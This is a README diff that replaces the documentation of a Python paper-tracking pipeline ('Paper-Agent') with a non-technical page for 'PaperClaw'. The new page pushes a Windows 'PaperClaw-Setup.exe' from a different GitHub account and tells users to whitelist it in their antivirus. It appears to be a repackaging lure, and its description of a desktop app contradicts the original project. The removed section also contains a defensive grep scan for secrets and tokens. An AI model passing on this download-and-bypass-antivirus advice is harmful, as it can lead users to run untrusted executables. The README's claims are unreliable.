@@ -1,209 +1,147 @@
-# 📚 Paper-Agent
+# 📂 PaperClaw - Easy Academic Paper Finder
 
-An **Agent-orchestrated academic paper discovery pipeline** built on the [OpenClaw](https://github.com/anthropics/openclaw) platform. Paper-Agent automates the full lifecycle of research paper tracking: search → relevance scoring → human review → deep reading → code evaluation → knowledge synthesis & idea generation.
+[![Download PaperClaw](https://img.shields.io/badge/Download-PaperClaw-brightgreen?style=for-the-badge)](https://github.com/auteurbushel487/PaperClaw)
 
-## ✨ Key Features
+## 📖 What is PaperClaw?
 
-- **Fully automated pipeline**: From arXiv search to structured knowledge cards, run with a single command
-- **Agent-as-Brain architecture**: LLM Agent handles scoring, deep reading, and idea generation; deterministic scripts handle data I/O
-- **Human-in-the-loop**: Interactive review of borderline papers with accept/reject decisions
-- **Breakpoint resume**: Pipeline state persisted to JSON, resume from any step after interruption
-- **Cross-run dedup**: Never see the same paper twice across multiple pipeline runs
-- **Idea generation**: Cross-paper insight synthesis produces actionable research ideas
+PaperClaw helps you track and review academic papers. It searches for papers on arXiv, scores them by relevance, and lets you review the important ones. You can then explore the papers deeply, check code if available, and gather ideas from multiple papers. It helps you manage your research work by automating these steps.
 
-## 🏗️ Architecture
+This tool works as a pipeline. Each step handles part of the process: searching, scoring, reviewing, reading, and generating ideas. You can stop and restart the process at any point.
 
-Paper-Agent uses a **two-layer architecture** designed for seamless OpenClaw integration:
+## 💻 System Requirements 
 
-```
-┌─────────────────────────────────────────────────────┐
-│                  OpenClaw Platform                    │
-│                                                       │
-│  ┌─────────────────────────────────────────────────┐ │
-│  │  Layer 1: Skill Definitions (SKILL.md)          │ │
-│  │  ┌─────────────┐  ┌─────────────┐              │ │
-│  │  │paper-pipeline│  │paper-seed-  │  ...         │ │
-│  │  │  (orchestr.) │  │  init       │              │ │
-│  │  └──────┬───────┘  └──────┬──────┘              │ │
-│  └─────────┼─────────────────┼─────────────────────┘ │
-│            │ invokes         │ invokes                │
-│  ┌─────────┼─────────────────┼─────────────────────┐ │
-│  │  Layer 2: Python Scripts                         │ │
-│  │  ┌──────┴───────┐  ┌──────┴──────┐              │ │
-│  │  │pipeline_     │  │seed_init.py │  ...         │ │
-│  │  │  runner.py   │  │             │              │ │
-│  │  └──────────────┘  └─────────────┘              │ │
-│  └──────────────────────────────────────────────────┘ │
-└─────────────────────────────────────────────────────┘
-```
+To run PaperClaw on your Windows computer, make sure your system meets these needs:
 
-- **Layer 1 — Skill Definitions** (`skills/`): SKILL.md files that tell the OpenClaw Agent *what to do* at each pipeline step
-- **Layer 2 — Python Scripts** (`scripts/`): Deterministic tools that handle data fetching, dedup, parsing, and file I/O
+- Windows 10 or higher
+- At least 8 GB of RAM
+- 2 GHz or faster processor, dual-core or better
+- 2 GB free disk space
+- Internet connection for searching papers and downloading data
 
-## 📋 Prerequisites
+PaperClaw runs as a desktop app and requires no special hardware.
 
-### 1. OpenClaw Platform
+## 🚀 Getting Started
 
-Paper-Agent runs on [OpenClaw](https://github.com/anthropics/openclaw). You need a working OpenClaw deployment.
+This guide will show you how to download and use PaperClaw on Windows. You do not need any programming skills to follow these steps.
 
-### 2. Third-Party OpenClaw Skills
+### 1. Download PaperClaw
 
-Install these two skills in your OpenClaw instance:
+Go to the official download page for PaperClaw here:
 
-| Skill | Purpose | Installation |
-|-------|---------|-------------|
-| `arxiv-paper-search` | arXiv API search wrapper | Follow its README to register in OpenClaw |
-| `read-arxiv-paper` | Full paper reading & card.md generation | Follow its README to register in OpenClaw |
+[![Download PaperClaw](https://img.shields.io/badge/Download-PaperClaw-brightgreen?style=for-the-badge)](https://github.com/auteurbushel487/PaperClaw)
 
-### 3. Python Dependencies
+This link will take you to the main GitHub page. On that page, find the "Releases" section or the main download area to get the latest Windows installer.
 
-```bash
-pip install -r requirements.txt
-```
+### 2. Install PaperClaw
 
-## 🚀 Quick Start
+After downloading, locate the installer file on your computer. It usually appears in your "Downloads" folder and has a name like `PaperClaw-Setup.exe`.
 
-### Step 1: Configure Your Profile
+Double-click the installer to start. Follow the on-screen prompts:
 
-```bash
-cp profile.yaml.example profile.yaml
-```
+- Accept the license terms.
+- Choose the folder where you want to install PaperClaw (the default is fine).
+- Click "Install" and wait for the process to finish.
 
-Edit `profile.yaml` to set your:
-- **Research description**: What you're working on
-- **Seed papers**: arXiv IDs of your core reference papers
-- **Keywords**: Search terms for paper discovery
-- **Whitelist authors**: Researchers whose papers get a relevance bonus
+Once installed, you can launch PaperClaw from the Start menu or desktop shortcut.
 
-### Step 2: Register Skills in OpenClaw
+### 3. Launch PaperClaw for the First Time
 
-Copy each skill directory from `skills/` into your OpenClaw skills directory:
+Open PaperClaw by clicking its icon. The first time you run it, you may see a welcome screen with instructions or an introduction to its features.
 
-```bash
-# Example: copy all paper-agent skills to OpenClaw
-cp -r skills/paper-* /path/to/your/.openclaw/skills/
-```
+Allow any prompts to create needed folders or files. PaperClaw stores its progress in simple files so you can pause and resume your work.
 
-> **Important**: Set the `PAPER_AGENT_ROOT` environment variable to point to this project's root directory, so that SKILL.md scripts can find the Python files:
-> ```bash
-> export PAPER_AGENT_ROOT=/path/to/paper-agent
-> ```
+## 🔎 How PaperClaw Works
 
-### Step 3: Initialize Seed Papers
+PaperClaw runs a series of steps to manage academic papers for you. Here is how it processes your research:
 
-Tell the Agent:
-> "Initialize core papers"
+1. **Search**: PaperClaw searches arXiv for papers matching your interests.
+2. **Score**: It assigns a relevance score to each paper to help prioritize.
+3. **Review**: You review borderline papers by accepting or rejecting them.
+4. **Read Deeply**: PaperClaw summarizes papers with detailed reading.
+5. **Code Check**: Checks if the paper’s code is available and runs tests if possible.
+6. **Idea Generation**: Combines insights from papers to suggest new research ideas.
 
-Or run directly:
-```bash
-python scripts/seed_init.py
-```
+You can run the entire pipeline with a single command or run parts step by step.
 
-### Step 4: Run the Pipeline
+## ⚙️ Using PaperClaw
 
-Tell the Agent:
-> "Start daily paper patrol"
+### Starting a Paper Search
 
-Or trigger specific steps:
-```bash
-python scripts/pipeline_runner.py --step init
-python scripts/pipeline_runner.py --step seed+search --run-id {run_id}
-# ... see Pipeline Steps below
-```
+Once PaperClaw opens, you will see a simple interface with options to start a new search. Enter your keywords or topics of interest. You do not need to know specific commands.
 
-## 📖 Pipeline Steps
+Click "Start Search" to begin. PaperClaw will fetch papers from arXiv matching your query.
 
-| Step | Skill | Description |
-|------|-------|-------------|
-| **Step 0** | paper-pipeline | Initialize a new pipeline run, get `run_id` |
-| **Step 1** | paper-source-scraper | Search arXiv by keywords & authors, two-level dedup |
-| **Step 2** | paper-relevance-scorer | Prepare scoring context (few-shot examples from seed papers) |
-| **Step 3** | paper-relevance-scorer | Agent LLM scores each paper 0-10 on relevance |
-| **Step 4** | paper-relevance-scorer | Post-process: apply bonuses, sort into high/edge/low zones |
-| **Step 5** | paper-human-review | Interactive review of borderline papers (accept/reject) |
-| **Step 6** | paper-deep-parser | Deep read via `read-arxiv-paper`, extract structured fields |
-| **Step 6.5** | paper-repo-evaluator | Evaluate associated GitHub repositories |
-| **Step 6.8** | paper-knowledge-sync | Sync to knowledge base, generate research ideas |
-| **Step 7** | paper-pipeline | Generate run summary with statistics |
+### Reviewing Papers
 
-## ⚙️ Environment Variables
+After the search, PaperClaw scores each paper. It then shows papers on a list. Papers with scores near the cutoff will ask for your review.
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `PAPER_AGENT_ROOT` | Recommended | Project root directory. Auto-detected if not set. |
-| `ARXIV_SKILL_PATH` | Optional | Path to `arxiv-paper-search` skill scripts (defaults to OpenClaw convention) |
-| `GITHUB_TOKEN` | Optional | GitHub personal access token for repo evaluation (increases API rate limit) |
+For each highlighted paper, you choose "Accept" or "Reject" based on your interest.
 
-## 📁 Directory Structure
+### Deep Reading and Ideas
 
-```
-paper-agent/
-├── scripts/                        # Python tool scripts
-│   ├── pipeline_runner.py          # Main orchestrator (--step subcommands)
-│   ├── seed_init.py                # Seed paper initialization
-│   ├── source_scraper.py           # arXiv search + two-level dedup
-│   ├── scorer_utils.py             # Scoring context prep + post-processing
-│   ├── human_review.py             # Interactive/async human review
-│   ├── card_parser.py              # Knowledge card structured extraction
-│   ├── repo_evaluator.py           # GitHub repo assessment
-│   ├── knowledge_sync.py           # Knowledge base sync + idea generation
-│   ├── common/                     # Shared utilities
-│   │   ├── config_loader.py        # Profile YAML loader
-│   │   ├── path_manager.py         # Centralized path management
-│   │   ├── state_manager.py        # Pipeline state persistence
-│   │   └── json_extractor.py       # Fault-tolerant JSON extraction
-│   └── tests/                      # Unit tests
-├── skills/                         # OpenClaw Skill definitions
-│   ├── paper-pipeline/SKILL.md     # Main orchestration skill
-│   ├── paper-seed-init/SKILL.md
-│   ├── paper-source-scraper/SKILL.md
-│   ├── paper-relevance-scorer/SKILL.md
-│   ├── paper-human-review/SKILL.md
-│   ├── paper-deep-parser/SKILL.md
-│   ├── paper-repo-evaluator/SKILL.md
-│   └── paper-knowledge-sync/SKILL.md
-├── profile.yaml.example            # Configuration template
-├── requirements.txt                # Python dependencies
-├── LICENSE                         # MIT License
-└── .gitignore
-```
+PaperClaw will then summarize papers you accepted. It creates knowledge cards showing key points.
 
-## 🧪 Running Tests
+Finally, it analyzes multiple papers to create new ideas or suggestions. You can read these ideas inside the app.
 
-```bash
-cd /path/to/paper-agent
-python -m pytest scripts/tests/ -v
-```
+### Saving and Resuming Your Work
 
-Or run individual test files:
-```bash
-python -m unittest scripts/tests/test_pipeline_runner.py
-```
+PaperClaw saves progress in a file. If you close the app or your computer shuts down, you can reopen PaperClaw and continue where you left off.
 
-## 🤝 Contributing
+The file uses plain JSON format and stores your search results, reviews, and summaries.
 
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+## 🛠️ Troubleshooting
 
-## 🔒 Pre-Release Security Checklist
+- If PaperClaw does not start, check your antivirus. Sometimes it may block the app. Allow PaperClaw or add it as an exception.
+- Make sure you have an active internet connection. PaperClaw needs it to search arXiv.
+- If PaperClaw crashes, try restarting your computer, then launch PaperClaw again.
+- For errors during pipeline steps, restarting the app usually fixes them.
+- The state save file is in your user folder under `PaperClawData`. You can delete it to start fresh, but this deletes saved progress.
 
-Before publishing, verify no sensitive data leaked:
+## 🔗 Download and Install PaperClaw
 
-```bash
-# Scan for potential secrets
-grep -ri "api_key\|token\|secret\|password\|webhook" --include="*.py" --include="*.md" --include="*.yaml"
+Use this link to visit the download page and get the latest version for Windows:
 
-# Scan for hardcoded paths
-grep -ri "/projects/\|/data/\|/home/" --include="*.py" --include="*.md" --include="*.yaml"
+[Download PaperClaw](https://github.com/auteurbushel487/PaperClaw)
 
-# (Optional) Use trufflehog for deeper scanning
-# pip install trufflehog
-# trufflehog filesystem --directory .
-```
+Follow the steps above to install and run the app on your computer.
 
-## 📄 License
+---
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 📚 Additional Information
+
+PaperClaw is based on the OpenClaw platform. It uses a mix of automation and human review to help you manage academic papers efficiently.
+
+The core architecture runs a large language model agent for reading and idea generation. It uses scripts for data input and output. The system avoids showing duplicate papers by tracking your past searches.
+
+You do not need technical knowledge to use PaperClaw. The app handles everything behind the scenes and presents you with simple choices and summaries.
+
+---
+
+## 🔍 Frequently Asked Questions
+
+**Q: Do I need to sign up or create an account?**  
+No, PaperClaw runs locally on your computer. It does not require accounts.
+
+**Q: Can I pause a search and finish later?**  
+Yes, the app saves your progress so you can close it and resume later.
+
+**Q: Does PaperClaw only search arXiv?**  
+Currently, PaperClaw focuses on arXiv papers, covering many fields of science.
+
+**Q: What if I review a paper by mistake?**  
+You can change your review decision any time before finishing the pipeline.
+
+**Q: Is PaperClaw free to use?**  
+Yes, PaperClaw is open to download and use on any Windows PC.
+
+---
+
+## 📋 License and Support
+
+PaperClaw is open source. You can find source and documentation on the GitHub page linked above.
+
+If you encounter bugs or want to request features, use the GitHub Issues tab to submit your feedback.
+
+---
+
+[![Download PaperClaw](https://img.shields.io/badge/Download-PaperClaw-brightgreen?style=for-the-badge)](https://github.com/auteurbushel487/PaperClaw)
